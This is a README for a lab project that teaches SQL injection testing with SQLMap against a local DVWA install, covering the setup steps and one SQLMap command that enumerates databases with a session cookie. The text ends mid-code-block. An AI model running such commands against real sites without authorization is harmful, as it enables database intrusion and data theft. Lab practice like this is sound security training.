# SQLMap – Automated SQL Injection Detection and Exploitation

## 📌 Project Description
This project demonstrates how SQL injection vulnerabilities can be detected and exploited using SQLMap. SQL injection is a common web security vulnerability that allows attackers to access and manipulate databases through malicious queries.

In this project, we use DVWA (Damn Vulnerable Web Application) as a testing environment and SQLMap to automate the attack process.

---

## 🎯 Objectives
- Understand SQL Injection attacks
- Use SQLMap to detect vulnerabilities
- Extract database information
- Demonstrate exploitation in a controlled environment

---

## 🛠️ Tools Used
- SQLMap
- DVWA (Damn Vulnerable Web Application)
- XAMPP (Apache + MySQL)
- Web Browser (Chrome)

---

## ⚙️ Setup Procedure

### 1. Install XAMPP
Start Apache and MySQL services.

### 2. Setup DVWA
- Place DVWA folder in `htdocs`
- Open `http://localhost/dvwa`
- Configure `config.inc.php`
- Run setup and create database

### 3. Set Security Level
- Login to DVWA
- Go to "DVWA Security"
- Set security level to **Low**

---

## 🚀 Commands Used

### 🔹 Detect Databases
```bash
python sqlmap.py -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=YOUR_SESSION; security=low" --dbs
